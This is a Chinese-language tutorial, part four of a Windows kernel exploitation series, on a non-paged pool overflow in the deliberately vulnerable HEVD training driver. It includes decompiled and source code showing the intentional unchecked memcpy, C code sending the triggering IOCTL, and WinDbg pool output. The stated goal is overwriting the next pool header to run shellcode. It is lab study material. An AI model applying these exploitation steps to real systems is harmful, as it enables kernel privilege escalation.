# 0x00：前言
这是 Windows kernel exploit
系列的第四部分，前一篇我们讲了任意内存覆盖漏洞，这一篇我们讲内核池溢出漏洞，这一篇篇幅虽然可能不会很多，但是需要很多的前置知识，也就是说，我们需要对Windows内存分配机制有一个深入的理解，我的建议是先看《0day安全：软件漏洞分析技术第二版》中的第五章堆溢出利用，里面很详细的讲解了堆的一些机制，但是主要讨论的是
Windows 2000～Windows XP SP1 平台的堆管理策略，看完了之后，类比堆溢出利用你可以看 Tarjei Mandt 写的 Kernel
Pool Exploitation on Windows 7 ，因为我们的实验平台是 Windows 7
的内核池，所以我们需要对内核池深入的理解，虽然是英文文档，但是不要惧怕，毕竟我花了一周的时间才稍微读懂了其中的一些内容(这也是这一篇更新比较慢的原因)，总之这个过程是漫长的，并不是一两天就能搞定的，话不多说，进入正题，看此文章之前你需要有以下准备：
  * Windows 7 x86 sp1虚拟机
  * 配置好windbg等调试工具，建议配合VirtualKD使用
  * HEVD+OSR Loader配合构造漏洞环境
传送门：
[+][Windows Kernel Exploit(一) -> UAF](https://xz.aliyun.com/t/5493)
[+][Windows Kernel Exploit(二) -> StackOverflow](https://xz.aliyun.com/t/5536)
[+][Windows Kernel Exploit(三) -> Write-What-Where](https://xz.aliyun.com/t/5615)
# 0x01：漏洞原理
## 池溢出原理
我们暂时先不看源码，先用IDA分析`HEVD.sys`，我们找到`TriggerPoolOverflow`函数，先静态分析一下函数在干什么，可以看到，函数首先用[`ExAllocatePoolWithTag`](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-exallocatepoolwithtag)函数分配了一块非分页内存池，然后将一些信息打印出来，又验证缓冲区是否驻留在用户模式下，然后用[`memcpy`](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=vs-2019)函数将`UserBuffer`拷贝到`KernelBuffer`，这和内核栈溢出有点似曾相识的感觉，同样的拷贝，同样的没有控制Size的大小，只是一个是栈溢出一个是池溢出
    int __stdcall TriggerPoolOverflow(void *UserBuffer, unsigned int Size)
    {
      int result; // eax
      PVOID KernelBuffer; // [esp+1Ch] [ebp-1Ch]
      DbgPrint("[+] Allocating Pool chunk\n");
      KernelBuffer = ExAllocatePoolWithTag(0, 0x1F8u, 0x6B636148u);
      if ( KernelBuffer )
      {
        DbgPrint("[+] Pool Tag: %s\n", "'kcaH'");
        DbgPrint("[+] Pool Type: %s\n", "NonPagedPool");
        DbgPrint("[+] Pool Size: 0x%X\n", 0x1F8);
        DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);
        ProbeForRead(UserBuffer, 0x1F8u, 1u);
        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%X\n", 0x1F8);
        DbgPrint("[+] Triggering Pool Overflow\n");
        memcpy(KernelBuffer, UserBuffer, Size);
        DbgPrint("[+] Freeing Pool chunk\n");
        DbgPrint("[+] Pool Tag: %s\n", "'kcaH'");
        DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);
        ExFreePoolWithTag(KernelBuffer, 0x6B636148u);
        result = 0;
      }
      else
      {
        DbgPrint("[-] Unable to allocate Pool chunk\n");
        result = 0xC0000017;
      }
      return result;
    }
漏洞的原理很简单，就是没有控制好传入Size的大小，为了更清楚的了解漏洞原理，我们分析一下源码文件`BufferOverflowNonPagedPool.c`，定位到关键点的位置，也就是说，安全的操作始终对分配的内存有严格的控制
    #ifdef SECURE
            //
            // Secure Note: This is secure because the developer is passing a size
            // equal to size of the allocated pool chunk to RtlCopyMemory()/memcpy().
            // Hence, there will be no overflow
            //
            RtlCopyMemory(KernelBuffer, UserBuffer, (SIZE_T)POOL_BUFFER_SIZE);
    #else
            DbgPrint("[+] Triggering Buffer Overflow in NonPagedPool\n");
            //
            // Vulnerability Note: This is a vanilla pool buffer overflow vulnerability
            // because the developer is passing the user supplied value directly to
            // RtlCopyMemory()/memcpy() without validating if the size is greater or
            // equal to the size of the allocated Pool chunk
            //
            RtlCopyMemory(KernelBuffer, UserBuffer, Size);
# 0x02：漏洞利用
## 控制码
漏洞的原理我们已经清楚了，但是关键点还是在利用上，内核池这个东西利用起来就不像栈一样那么简单了，我们还是一步一步的构造我们的exploit吧，首先根据上一篇的经验我们知道如何计算控制码从而调用`TriggerPoolOverflow`函数，首先找到`HackSysExtremeVulnerableDriver.h`中定义`IOCTL`的地方，找到我们对应的函数
    #define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL                IOCTL(0x803)
然后我们用python计算一下控制码
    >>> hex((0x00000022 
    #include
    HANDLE hDevice = NULL;
    BOOL init()
    {
        // Get HANDLE
        hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
            GENERIC_READ | GENERIC_WRITE,
            NULL,
            NULL,
            OPEN_EXISTING,
            NULL,
            NULL);
        printf("[+]Start to get HANDLE...\n");
        if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
        {
            return FALSE;
        }
        printf("[+]Success to get HANDLE!\n");
        return TRUE;
    }
    int main()
    {
        DWORD bReturn = 0;
        char buf[8];
        if (init() == FALSE)
        {
            printf("[+]Failed to get HANDLE!!!\n");
            system("pause");
            return 0;
        }
        RtlFillMemory(buf, 8, 0x41);
        DeviceIoControl(hDevice, 0x22200f, buf, 8, NULL, 0, &bReturn, NULL);
        return 0;
    }
运行一下如我们所愿调用了`TriggerPoolOverflow`函数，另外我们可以发现 Pool Size 有 0x1F8(504)
的大小(如果你细心的话其实在IDA中也能看到，另外你可以尝试着多传入几个字节的大小破坏下一块池头的内容，看看是否会蓝屏)
    0: kd> g
    ****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ******
    [+] Allocating Pool chunk
    [+] Pool Tag: 'kcaH'
    [+] Pool Type: NonPagedPool
    [+] Pool Size: 0x1F8
    [+] Pool Chunk: 0x8674B610
    [+] UserBuffer: 0x001BFB58
    [+] UserBuffer Size: 0x8
    [+] KernelBuffer: 0x8674B610
    [+] KernelBuffer Size: 0x1F8
    [+] Triggering Pool Overflow
    [+] Freeing Pool chunk
    [+] Pool Tag: 'kcaH'
    [+] Pool Chunk: 0x8674B610
    ****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ******
我们现在需要了解内核池分配的情况，所以我们需要在拷贝函数执行之前下断点观察，我们把 buf 设为 0x1F8 大小
    1: kd> u 8D6A320B // 反编译查看断点位置是否下对
    HEVD!TriggerPoolOverflow+0xe1 [c:\hacksysextremevulnerabledriver\driver\pooloverflow.c @ 113]:
    8d6a320b e8cacfffff      call    HEVD!memcpy (8d6a01da)
    8d6a3210 686c436a8d      push    offset HEVD! ?? ::NNGAKEGL::`string' (8d6a436c)
    8d6a3215 e8eccdffff      call    HEVD!DbgPrint (8d6a0006)
    8d6a321a 6834446a8d      push    offset HEVD! ?? ::NNGAKEGL::`string' (8d6a4434)
    8d6a321f 53              push    ebx
    8d6a3220 e8e1cdffff      call    HEVD!DbgPrint (8d6a0006)
    8d6a3225 ff75e4          push    dword ptr [ebp-1Ch]
    8d6a3228 57              push    edi
    1: kd> ba e1 8D6A320B // 下硬件执行断点
    1: kd> g
    ****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ******
    [+] Allocating Pool chunk
    [+] Pool Tag: 'kcaH'
    [+] Pool Type: NonPagedPool
    [+] Pool Size: 0x1F8
    [+] Pool Chunk: 0x88CAAA90
    [+] UserBuffer: 0x001FF82C
    [+] UserBuffer Size: 0x1F8
    [+] KernelBuffer: 0x88CAAA90
    [+] KernelBuffer Size: 0x1F8
    [+] Triggering Pool Overflow
    Breakpoint 0 hit
    HEVD!TriggerPoolOverflow+0xe1:
    8c6d120b e8cacfffff      call    HEVD!memcpy (8c6ce1da)
我们可以用`!pool address`命令查看address周围地址处的池信息
    kd> !pool 0x88CAAA90
    Pool page 88caaa90 region is Nonpaged pool
     88caa000 size:  118 previous size:    0  (Allocated)  AfdE (Protected)
     88caa118 size:    8 previous size:  118  (Free)       Ipng
     88caa120 size:   68 previous size:    8  (Allocated)  EtwR (Protected)
     88caa188 size:  2e8 previous size:   68  (Free)       Thre
     88caa470 size:  118 previous size:  2e8  (Allocated)  AfdE (Protected)
     88caa588 size:  190 previous size:  118  (Free)       AleD
     88caa718 size:   68 previous size:  190  (Allocated)  EtwR (Protected)
     88caa780 size:   48 previous size:   68  (Allocated)  Vad 
     88caa7c8 size:   30 previous size:   48  (Allocated)  NpFn Process: 88487d40
     88caa7f8 size:   f8 previous size:   30  (Allocated)  MmCi
     88caa8f0 size:   48 previous size:   f8  (Allocated)  Vad 
     88caa938 size:  138 previous size:   48  (Allocated)  ALPC (Protected)
     88caaa70 size:   18 previous size:  138  (Allocated)  CcWk
    *88caaa88 size:  200 previous size:   18  (Allocated) *Hack
            Owning component : Unknown (update pooltag.txt)
     88caac88 size:   20 previous size:  200  (Allocated)  ReTa
     88caaca8 size:  190 previous size:   20  (Free)       AleD
     88caae38 size:  1c8 previous size:  190  (Allocated)  AleE
我们查看我们申请到池的末尾，0x41414141之后就是下一个池的池首，我们待会主要的目的就是修改下一个池首的内容，从而运行我们shellcode
    kd> dd 88caac88-8